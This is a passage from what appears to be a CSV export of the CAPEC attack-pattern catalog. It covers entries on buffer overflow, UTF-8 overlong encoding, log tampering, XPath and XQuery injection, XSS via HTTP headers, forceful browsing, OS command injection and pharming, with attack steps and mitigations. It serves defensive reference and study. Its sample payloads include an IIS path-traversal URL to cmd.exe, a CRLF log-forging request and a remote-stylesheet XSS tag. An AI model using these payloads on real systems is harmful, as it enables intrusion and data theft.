user.::One or more API functions exposed by the target host has a buffer overflow vulnerability.::\",\"::SKILL:An adversary can simply overflow a buffer by inserting a long string into an adversary-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Use a language or compiler that performs automatic bounds checking.::Use secure functions not vulnerable to buffer overflow.::If you have to use dangerous functions, make sure that you do boundary checking.::Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Use OS-level preventative functionality. Not a complete solution.::\",\"::Attack Example: Libc in FreeBSD A buffer overflow in the FreeBSD utility setlocale (found in the libc module) puts many programs at risk all at once.::Xtlib A buffer overflow in the Xt library of the X windowing system allows local users to execute commands with root privileges.::\",\"::120::119::118::74::20::680::733::697::\",\"\",\"\",\n80,\"Using UTF-8 Encoding to Bypass Validation Logic\",Detailed,Draft,\"This attack is a specific variation on leveraging alternate encodings to bypass validation logic. This attack leverages the possibility to encode potentially harmful input in UTF-8 and submit it to applications not expecting or effective at validating this encoding standard making input filtering difficult. UTF-8 (8-bit UCS/Unicode Transformation Format) is a variable-length character encoding for Unicode. Legal UTF-8 characters are one to four bytes long. However, early version of the UTF-8 specification got some entries wrong (in some cases it permitted overlong characters). UTF-8 encoders are supposed to use the shortest possible encoding, but naive decoders may accept encodings that are longer than necessary. According to the RFC 3629, a particularly subtle form of this attack can be carried out against a parser which performs security-critical validity checks against the UTF-8 encoded form of its input, but interprets certain illegal octet sequences as characters.\",\"\",High,High,\"::NATURE:PeerOf:CAPEC ID:64::NATURE:PeerOf:CAPEC ID:71::NATURE:ChildOf:CAPEC ID:267::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The attacker uses the entry points gathered in the Explore phase as a target list and injects various UTF-8 encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Try to use UTF-8 encoding of content in Scripts in order to bypass validation routines.:TECHNIQUE:Try to use UTF-8 encoding of content in HTML in order to bypass validation routines.:TECHNIQUE:Try to use UTF-8 encoding of content in CSS in order to bypass validation routines.::\",\"::The application's UTF-8 decoder accepts and interprets illegal UTF-8 characters or non-shortest format of UTF-8 encoding.::Input filtering and validating is not done properly leaving the door open to harmful characters for the target host.::\",\"::SKILL:An attacker can inject different representation of a filtered character in UTF-8 format.:LEVEL:Low::SKILL:An attacker may craft subtle encoding of input data by using the knowledge that they have gathered about the target host.:LEVEL:Medium::\",\"\",\"::A web page that contains overly long UTF-8 codes constitute a protocol anomaly, and could be an indication that an attacker is attempting to exploit a vulnerability on the target host.::An attacker can use a fuzzer in order to probe for a UTF-8 encoding vulnerability. The fuzzer should generate suspicious network activity noticeable by an intrusion detection system.::An IDS filtering network traffic may be able to detect illegal UTF-8 characters.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::\",\"::The Unicode Consortium recognized multiple representations to be a problem and has revised the Unicode Standard to make multiple representations of the same code point with UTF-8 illegal. The UTF-8 Corrigendum lists the newly restricted UTF-8 range (See references). Many current applications may not have been revised to follow this rule. Verify that your application conform to the latest UTF-8 encoding specification. Pay extra attention to the filtering of illegal characters.::The exact response required from an UTF-8 decoder on invalid input is not uniformly defined by the standards. In general, there are several ways a UTF-8 decoder might behave in the event of an invalid byte sequence: 1. Insert a replacement character (e.g. '?', ''). 2. Ignore the bytes. 3. Interpret the bytes according to a different character encoding (often the ISO-8859-1 character map). 4. Not notice and decode as if the bytes were some similar bit of UTF-8. 5. Stop decoding and report an error (possibly giving the caller the option to continue). It is possible for a decoder to behave in different ways for different types of invalid input. RFC 3629 only requires that UTF-8 decoders must not decode overlong sequences (where a character is encoded in more bytes than needed but still adheres to the forms above). The Unicode Standard requires a Unicode-compliant decoder to ...treat any ill-formed code unit sequence as an error condition. This guarantees that it will neither interpret nor emit an ill-formed code unit sequence. Overlong forms are one of the most troublesome types of UTF-8 data. The current RFC says they must not be decoded but older specifications for UTF-8 only gave a warning and many simpler decoders will happily decode them. Overlong forms have been used to bypass security validations in high profile products including Microsoft's IIS web server. Therefore, great care must be taken to avoid security issues if validation is performed before conversion from UTF-8, and it is generally much simpler to handle overlong forms before any input validation is done. To maintain security in the case of invalid input, there are two options. The first is to decode the UTF-8 before doing any input validation checks. The second is to use a decoder that, in the event of invalid input, returns either an error or text that the application considers to be harmless. Another possibility is to avoid conversion out of UTF-8 altogether but this relies on any other software that the data is passed to safely handling the invalid data. Another consideration is error recovery. To guarantee correct recovery after corrupt or lost bytes, decoders must be able to recognize the difference between lead and trail bytes, rather than just assuming that bytes will be of the type allowed in their position.::For security reasons, a UTF-8 decoder must not accept UTF-8 sequences that are longer than necessary to encode a character. If you use a parser to decode the UTF-8 encoding, make sure that parser filter the invalid UTF-8 characters (invalid forms or overlong forms).::Look for overlong UTF-8 sequences starting with malicious pattern. You can also use a UTF-8 decoder stress test to test your UTF-8 parser (See Markus Kuhn's UTF-8 and Unicode FAQ in reference section)::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.::\",\"::Perhaps the most famous UTF-8 attack was against unpatched Microsoft Internet Information Server (IIS) 4 and IIS 5 servers. If an attacker made a request that looked like this http://servername/scripts/..%c0%af../winnt/system32/ cmd.exe the server didn't correctly handle %c0%af in the URL. What do you think %c0%af means? It's 11000000 10101111 in binary; and if it's broken up using the UTF-8 mapping rules, we get this: 11000000 10101111. Therefore, the character is 00000101111, or 0x2F, the slash (/) character! The %c0%af is an invalid UTF-8 representation of the / character. Such an invalid UTF-8 escape is often referred to as an overlong sequence. So when the attacker requested the tainted URL, they accessed http://servername/scripts/../../winnt/system32/cmd.exe In other words, they walked out of the script's virtual directory, which is marked to allow program execution, up to the root and down into the system32 directory, where they could pass commands to the command shell, Cmd.exe.See also: CVE-2000-0884::\",\"::173::172::180::181::73::74::20::697::692::\",\"\",\"\",\n81,\"Web Server Logs Tampering\",Detailed,Draft,\"Web Logs Tampering attacks involve an attacker injecting, deleting or otherwise tampering with the contents of web logs typically for the purposes of masking other malicious behavior. Additionally, writing malicious data to log files may target jobs, filters, reports, and other agents that process the logs in an asynchronous attack pattern. This pattern of attack is similar to Log Injection-Tampering-Forging except that in this case, the attack is targeting the logs of the web server and not the application.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:268::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Application Web Server Log File Format] The attacker observes the system and looks for indicators of which logging utility is being used by the web server.:TECHNIQUE:Determine logging utility being used by application web server (e.g. log4j), only possible if the application is known by the attacker or if the application returns error messages with logging utility information.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine Injectable Content] The attacker launches various logged actions with malicious data to determine what sort of log injection is possible.:TECHNIQUE:Attacker triggers logged actions with maliciously crafted data as inputs, parameters, arguments, etc.::STEP:3:PHASE:Exploit:DESCRIPTION:[Manipulate Log Files] The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted request that the web server will receive and write into the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.:TECHNIQUE:Indirectly through injection, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example: The HTTP request for /index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] GET /forged-path HTTP/1.1 200 - - USER_AGENT may add the log line into Apache access_log (for example). Different applications may require different encodings of the carriage return and line feed characters.:TECHNIQUE:Directly through log file or database manipulation, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example: The HTTP request for /index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] GET /forged-path HTTP/1.1 200 - - USER_AGENT may add the log line into Apache access_log (for example). Different applications may require different encodings of the carriage return and line feed characters.:TECHNIQUE:Directly through log file or database manipulation, modify existing log entries.::\",\"::Target server software must be a HTTP server that performs web logging.::\",\"::SKILL:To input faked entries into Web logs:LEVEL:Low::\",\"::Ability to send specially formatted HTTP request to web server::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Design: Use input validation before writing to web log::Design: Validate all log data before it is output::\",\"::Most web servers have a public interface, even if the majority of the site is password protected, there is usually at least a login site and brochureware that is publicly available. HTTP requests to the site are also generally logged to a Web log. From an attacker point of view, standard HTTP requests containing a malicious payload can be sent to the public website (with no other access required), when those requests appear in the log (such as http://victimsite/index.html?< malicious script> if they are followed by an administrator this may be sufficient to probe the administrator's host or local network.::\",\"::117::93::75::221::96::20::150::276::279::116::\",\"\",\"\",\n83,\"XPath Injection\",Detailed,Draft,\"An attacker can craft special user-controllable input consisting of XPath expressions to inject the XML database and bypass authentication or glean information that they normally would not be able to. XPath Injection enables an attacker to talk directly to the XML database, thus bypassing the application completely. XPath Injection results from the failure of an application to properly sanitize input used as part of dynamic XPath expressions used to query an XML database.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:250::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an adversary records all instances of user-controllable input used to contruct XPath queries.:TECHNIQUE:Use an automated tool to record all instances of user-controllable input used to contruct XPath queries.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes inputs.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine the tructure of queries] Using manual or automated means, test inputs found for XPath weaknesses.:TECHNIQUE:Use an automated tool automatically probe the inputs for XPath weaknesses.:TECHNIQUE:Manually probe the inputs using characters such as single quote (') that can cause XPath-releated errors, thus indicating an XPath weakness.::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject content into XPath query] Craft malicious content containing XPath expressions that is not validated by the application and is executed as part of the XPath queries.:TECHNIQUE:Use the crafted input to execute unexpected queries that can disclose sensitive database information to the attacker.:TECHNIQUE:Use a combination of single quote (') and boolean expressions such as or 1=1 to manipulate XPath logic.:TECHNIQUE:Use XPath functions in the malicious content such as string-length, substring, or count to gain information about the XML document structure being used.::\",\"::XPath queries used to retrieve information stored in XML documents::User-controllable input not properly sanitized before being used as part of XPath queries::\",\"::SKILL:XPath Injection shares the same basic premises with SQL Injection. An attacker must have knowledge of XPath syntax and constructs in order to successfully leverage XPath Injection:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"::Too many exceptions generated by the application as a result of malformed XPath queries::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XPath expression. Characters such as a single-quote(') or operators such as or (|), and (&) and such should be filtered if the application does not expect them in the context in which they appear. If such content cannot be filtered, it must at least be properly escaped to avoid them being interpreted as part of XPath expressions.::Use of parameterized XPath queries - Parameterization causes the input to be restricted to certain domains, such as strings or integers, and any input outside such domains is considered invalid and the query fails.::Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.::\",\"::Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.::\",\"::91::74::20::707::\",\"TAXONOMY NAME:WASC:ENTRY ID:39:ENTRY NAME:XPath Injection::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Blind XPath Injection::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:XPATH Injection::\",\"\",\n84,\"XQuery Injection\",Detailed,Draft,\"This attack utilizes XQuery to probe and attack server systems; in a similar manner that SQL Injection allows an attacker to exploit SQL calls to RDBMS, XQuery Injection uses improperly validated data that is passed to XQuery commands to traverse and execute commands that the XQuery routines have access to. XQuery injection can be used to enumerate elements on the victim's environment, inject commands to the local host, or execute queries to remote files and data sources.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:250::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to XQL injection, attempt to inject characters that have special meaning in XQL. The goal is to create an XQL query with an invalid syntax.:TECHNIQUE:Use web browser to inject input through text fields or through HTTP GET parameters.:TECHNIQUE:Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.:TECHNIQUE:Use XML files to inject input.:TECHNIQUE:Use network-level packet injection tools such as netcat to inject input:TECHNIQUE:Use modified client (modified by reverse engineering) to inject input.::STEP:3:PHASE:Exploit:DESCRIPTION:[Information Disclosure] The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to inappropriate disclosure of information.:TECHNIQUE:Leveraging one of the vulnerable inputs identified during the Experiment phase, inject malicious XQuery payload. The payload aims to get information on the structure of the underlying XML database and/or the content in it.::STEP:4:PHASE:Exploit:DESCRIPTION:[Manipulate the data in the XML database] The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to modification of application data.:TECHNIQUE:Leveraging one of the vulnerable inputs identified during the Experiment phase, inject malicious XQuery payload.. The payload tries to insert or replace data in the XML database.::\",\"::The XQL must execute unvalidated data::\",\"::SKILL:Basic understanding of XQuery:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Design: Perform input allowlist validation on all XML input::Implementation: Run xml parsing and query infrastructure with minimal privileges so that an attacker is limited in their ability to probe other system resources from XQL.::\",\"::An attacker can pass XQuery expressions embedded in otherwise standard XML documents. Like SQL injection attacks, the attacker tunnels through the application entry point to target the resource access layer. The string below is an example of an attacker accessing the accounts.xml to request the service provider send all user names back. doc(accounts.xml)//user[Name='*'] The attacks that are possible through XQuery are difficult to predict, if the data is not validated prior to executing the XQL.::\",\"::74::707::\",\"TAXONOMY NAME:WASC:ENTRY ID:46:ENTRY NAME:XQuery Injection::\",\"\",\n85,\"AJAX Footprinting\",Detailed,Draft,\"This attack utilizes the frequent client-server roundtrips in Ajax conversation to scan a system. While Ajax does not open up new vulnerabilities per se, it does optimize them from an attacker point of view. A common first step for an attacker is to footprint the target environment to understand what attacks will work. Since footprinting relies on enumeration, the conversational pattern of rapid, multiple requests and responses that are typical in Ajax applications enable an attacker to look for many vulnerabilities, well-known ports, network locations and so on. The knowledge gained through Ajax fingerprinting can be used to support other attacks, such as XSS.\",\"\",High,Low,\"::NATURE:ChildOf:CAPEC ID:580::NATURE:CanPrecede:CAPEC ID:63::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Send request to target webpage and analyze HTML] Using a browser or an automated tool, an adversary sends requests to a webpage and records the received HTML response. Adversaries then analyze the HTML to identify any known underlying JavaScript architectures. This can aid in mappiong publicly known vulnerabilities to the webpage and can also helpo the adversary guess application architecture and the inner workings of a system.:TECHNIQUE:Record all src values inside script tags. These JavaScript files are compared to lists of files for known architectures. If there is a large match between the src values and architecture files, then it can be assumed that particular architecture is being used.::\",\"::The user must allow JavaScript to execute in their browser::\",\"::SKILL:To land and launch a script on victim's machine with appropriate footprinting logic for enumerating services and vulnerabilities in JavaScript:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Design: Use browser technologies that do not allow client side scripting.::Implementation: Perform input validation for all remote content.::\",\"::Footprinting can be executed over almost any protocol including HTTP, TCP, UDP, and ICMP, with the general goal of gaining further information about a host environment to launch further attacks. The attacker can probe the system for banners, vulnerabilities, filenames, available services, and in short anything the host process has access to. The results of the probe are either used to execute javascript (for example, if the attackers' footprint script identifies a vulnerability in a firewall permission, then the client side script executes a javascript to change client firewall settings, or an attacker may simply echo the results of the scan back out to a remote host for targeting future attacks) or to inform other data gathering activities in order to craft atta.::\",\"::79::113::348::96::20::116::184::86::692::\",\"\",\"\",\n86,\"XSS Through HTTP Headers\",Detailed,Draft,\"An adversary exploits web applications that generate web content, such as links in a HTML page, based on unvalidated or improperly validated data submitted by other actors. XSS in HTTP Headers attacks target the HTTP headers which are hidden from most users and may not be validated by web applications.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:588::NATURE:ChildOf:CAPEC ID:592::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for public links] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the entry points (input) that becomes part of generated HTTP header (not only GET/POST/COOKIE, but also Content-Type, etc.):TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters used in the HTTP headers.:TECHNIQUE:Look for HTML meta tags that could be injectable:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS vulnerability]The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. They record all the responses from the server that include unmodified versions of their script. The adversary tries also to inject extra-parameter to the HTTP request to see if they are reflected back in the web page or in the HTTP response.:TECHNIQUE:Manually inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.:TECHNIQUE:Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Change a URL parameter which is used in an HTTP header to include a malicious script tag. Because it is in the header it may bypass validation.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::\",\"::Target software must be a client that allows scripting communication from remote hosts.::\",\"::SKILL:To achieve a redirection and use of less trusted source, an adversary can simply edit HTTP Headers that are sent to client machine.:LEVEL:Low::SKILL:Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.:LEVEL:High::\",\"::The adversary must have the ability to deploy a custom hostile service for access by targeted clients and the abbility to communicate synchronously or asynchronously with client machine. The adversary must also control a remote site of some sort to redirect client and data to.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type, character, and encoding enforcement::Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Perform input validation for all remote content.::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Session tokens for specific host::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.::\",\"::Utilize a remote style sheet set in the HTTP header for XSS attack. When the adversary is able to point to a remote stylesheet, any of the variables set in that stylesheet are controllable on the client side by the remote adversary. Like most XSS attacks, results vary depending on browser that is used [REF-97]. <META HTTP-EQUIV=Link Content=<http://ha.ckers.org/xss.css>; REL=stylesheet>::Google's 404 redirection script was found vulnerable to this attack vector. Google's 404 file not found page read * Response headers: Content-Type: text/html; charset=[encoding]. * Response body: <META http-equiv=Content-Type (...) charset=[encoding]/> If the response sends an unexpected encoding type such as UTF-7, then no enforcement is done on the payload and arbitrary XSS code will be transported along with the standard HTTP response. [REF-476]::XSS can be used in variety of ways, because it is scripted and executes in a distributed, asynchronous fashion it can create its own vector and openings. For example, the adversary can use XSS to mount a DDoS attack by having series of different computers unknowingly executing requests against a single host.::\",\"::80::\",\"\",\"\",\n87,\"Forceful Browsing\",Standard,Draft,\"An attacker employs forceful browsing (direct URL entry) to access portions of a website that are otherwise unreachable. Usually, a front controller or similar design pattern is employed to protect access to portions of a web application. Forceful browsing enables an attacker to access information, perform privileged operations and otherwise reach sections of the web application that have been improperly protected.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:115::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Spider] Using an automated tool, an attacker follows all public links on a web site. They record all the links they find.:TECHNIQUE:Use a spidering tool to follow and record all links.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt well-known or guessable resource locations] Using an automated tool, an attacker requests a variety of well-known URLs that correspond to administrative, debugging, or other useful internal actions. They record all the positive responses from the server.:TECHNIQUE:Use a spidering tool to follow and record attempts on well-known URLs.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of attempts on well-known URLs.::STEP:3:PHASE:Exploit:DESCRIPTION:[Use unauthorized resources] By visiting the unprotected resource, the attacker makes use of unauthorized functionality.:TECHNIQUE:Access unprotected functions and execute them.::STEP:4:PHASE:Exploit:DESCRIPTION:[View unauthorized data] The attacker discovers and views unprotected sensitive data.:TECHNIQUE:Direct request of protected pages that directly access database back-ends. (e.g., list.jsp, accounts.jsp, status.jsp, etc.)::\",\"::The forcibly browseable pages or accessible resources must be discoverable and improperly protected.::\",\"::SKILL:Forcibly browseable pages can be discovered by using a number of automated tools. Doing the same manually is tedious but by no means difficult.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack. A directory listing is helpful, but not a requirement.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Authenticate request to every resource. In addition, every page or resource must ensure that the request it is handling has been made in an authorized context.::Forceful browsing can also be made difficult to a large extent by not hard-coding names of application pages or resources. This way, the attacker cannot figure out, from the application alone, the resources available from the present context.::\",\"::A bulletin board application provides an administrative interface at admin.aspx when the user logging in belongs to the administrators group. An attacker can access the admin.aspx interface by making a direct request to the page. Not having access to the interface appropriately protected allows the attacker to perform administrative functions without having to authenticate themself in that role.::\",\"::425::285::693::\",\"TAXONOMY NAME:WASC:ENTRY ID:34:ENTRY NAME:Predictable Resource Location::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Forced browsing::\",\"\",\n88,\"OS Command Injection\",Standard,Draft,\"In this type of an attack, an adversary injects operating system commands into existing application functions. An application that uses untrusted input to build command strings is vulnerable. An adversary can leverage OS command injection in an application to elevate privileges, execute arbitrary commands and compromise the underlying operating system.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:248::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify inputs for OS commands] The attacker determines user controllable input that gets passed as part of a command to the underlying operating system.:TECHNIQUE:Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.:TECHNIQUE:TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.:TECHNIQUE:Induce errors to find informative error messages::STEP:2:PHASE:Explore:DESCRIPTION:[Survey the Application] The attacker surveys the target application, possibly as a valid and authenticated user:TECHNIQUE:Spidering web sites for all available links:TECHNIQUE:Inventory all application inputs::STEP:3:PHASE:Experiment:DESCRIPTION:[Vary inputs, looking for malicious results.] Depending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input, containing OS commands, to be passed to the application:TECHNIQUE:Inject command delimiters using network packet injection tools (netcat, nemesis, etc.):TECHNIQUE:Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.)::STEP:4:PHASE:Exploit:DESCRIPTION:[Execute malicious commands] The attacker may steal information, install a back door access mechanism, elevate privileges or compromise the system in some other way.:TECHNIQUE:The attacker executes a command that stores sensitive information into a location where they can retrieve it later (perhaps using a different command injection).::\",\"::User controllable input used as part of commands to the underlying operating system.::\",\"::SKILL:The attacker needs to have knowledge of not only the application to exploit but also the exact nature of commands that pertain to the target operating system. This may involve, though not always, knowledge of specific assembly commands for the platform.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Use language APIs rather than relying on passing data to the operating system shell or command line. Doing so ensures that the available protection mechanisms in the language are intact and applicable.::Filter all incoming data to escape or remove characters or strings that can be potentially misinterpreted as operating system or shell commands::All application processes should be run with the minimal privileges required. Also, processes must shed privileges as soon as they no longer require them.::\",\"::A transaction processing system relies on code written in a number of languages. To access this functionality, the system passes transaction information on the system command line. An attacker can gain access to the system command line and execute malicious commands by injecting these commands in the transaction data. If successful, the attacker can steal information, install backdoors and perform other nefarious activities that can compromise the system and its data.See also: A vulnerability in Mozilla Firefox 1.x browser allows an attacker to execute arbitrary commands on the UNIX/Linux operating system. The vulnerability is caused due to the shell script used to launch Firefox parsing shell commands that are enclosed within back-ticks in the URL provided via the command line. This can be exploited to execute arbitrary shell commands by tricking a user into following a malicious link in an external application which uses Firefox as the default browser (e.g. the mail client Evolution on Red Hat Enterprise Linux 4).::\",\"::78::88::20::697::\",\"TAXONOMY NAME:WASC:ENTRY ID:31:ENTRY NAME:OS Commanding::\",\"\",\n89,\"Pharming\",Standard,Draft,\"A pharming attack occurs when the victim is fooled into entering sensitive data into supposedly trusted locations, such as an online bank site or a trading platform. An attacker can impersonate these supposedly trusted sites and have the victim be directed to their site rather than the originally intended one. Pharming does not require script injection or clicking on malicious links for the attack to succeed.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:151::\",\"::STEP:1:PHASE:Exploit:DESCRIPTION:Attacker sets up a system mocking the one trusted by the users. This is usually a website that requires or handles sensitive information.::STEP:2:PHASE:Exploit:DESCRIPTION:The attacker then poisons the resolver for the targeted site. This is achieved by poisoning the DNS server, or the local hosts file, that directs the user to the original website::STEP:3:PHASE:Exploit:DESCRIPTION:When the victim requests the URL for the site, the poisoned records direct the victim to the attackers' system rather than the original one.::STEP:4:PHASE:Exploit:DESCRIPTION:Because of the identical nature of the original site and the attacker controlled one, and the fact that the URL is still the original one, the victim trusts the website reached and the attacker can now farm sensitive information such as credentials or account numbers.::\",\"::Vulnerable DNS software or improperly protected hosts file or router that can be poisoned::A website that handles sensitive information but does not use a secure connection and a certificate that is valid is also prone to pharming::\",\"::SKILL:The attacker needs to be able to poison the resolver - DNS entries or local hosts file or router entry pointing to a trusted DNS server - in order to successfully carry out a pharming attack. Setting up a fake website, identical to the targeted one, does not require special skills.:LEVEL:Medium::\",\"::None: No 